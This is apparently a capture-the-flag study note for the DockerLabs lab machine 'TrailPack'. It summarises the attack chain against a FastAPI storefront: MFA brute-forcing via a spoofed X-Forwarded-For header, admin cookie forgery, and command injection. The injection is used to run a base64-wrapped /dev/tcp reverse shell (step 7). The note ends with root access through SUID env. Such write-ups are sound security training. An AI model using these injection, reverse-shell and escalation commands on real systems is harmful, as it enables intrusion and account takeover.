---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 172.17.0.2
cves: []
tools: [nmap, gobuster, burp-suite, curl, netcat, gtfobins]
techniques: [directory-fuzzing, mfa-bruteforce, broken-access-control, session-and-cookie-abuse, command-injection, source-code-disclosure, hardcoded-credentials, reverse-shells, suid-enumeration]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[pipepwned]]"]
---

# TrailPack

**Writeup:** [raw writeup](../../writeups/dockerlabs/intermediate/trailpack.md)

Intermediate box: a Spanish mountain-gear storefront (FastAPI/Uvicorn). The chain runs web-only end-to-end — MFA brute-force → client-side role tampering → command injection → SUID `env` root.

## Path

1. **Recon** — `nmap` shows a single `8000/tcp http` (Uvicorn), "TrailPack" storefront.
2. **Web enum** — [[gobuster]] finds `login`, `register`, `logout`, plus `dashboard` and `accounting` (both `307 → /login` when unauthenticated).
3. **MFA** — after registering + logging in, a 4-digit code is requested at `/verify-mfa` (not surfaced by fuzzing). The rate limiter/attempt counter keys off `X-Forwarded-For`, so spoofing a fresh IP per request brute-forces all 10,000 codes on one session ([[mfa-bruteforce]]) → code `5271`.
4. **Role tampering** — the dashboard's JS calls `/api/me` and writes a `user_info` cookie = `btoa({user, role, email})`. The backend trusts that client-supplied `role` for `/accounting`, so re-encoding the cookie with `"role":"admin"` grants admin access ([[broken-access-control]], [[session-and-cookie-abuse]]). Flag in raw writeup.
5. **User enum** — `/accounting` lists users + emails (`hacker@hacker.com` is the planted outlier).
6. **Command injection** — the complaints form executes its input: `test; whoami` → `balutron` ([[command-injection]]).
7. **Reverse shell** — `; echo <b64> | base64 -d | bash` runs `sh -i >& /dev/tcp/…/443 0>&1` → shell as `balutron` ([[reverse-shells]]).
8. **Credential leak** — `cat main.py` (once on-box) exposes the in-memory `USERS` dict (plaintext passwords next to `hash_pw(...)`) and `MFA_PINS` ([[source-code-disclosure]], [[hardcoded-credentials]]).
9. **Escalation** — `find / -perm -4000` → `/usr/bin/env` is SUID; `env /bin/sh -p` → **root** ([[suid-enumeration]]).

## Credentials / secrets

| Item | Value |
|------|-------|
| MFA code (own account) | `5271` |
| `balutron` | foothold via command injection |
| `main.py` `USERS` | DNI → plaintext password (`chocolate`, `barcelona`, `123456`, `password`) |

## Takeaways

- A 4-digit OTP with an `X-Forwarded-For`-keyed limiter is brute-forceable in seconds ([[mfa-bruteforce]]).
- A `role` in a *client-side* cookie with no server re-validation is broken access control ([[broken-access-control]]).
- "XSS didn't work" was the tell: the field was *executing* input, not reflecting it → [[command-injection]].
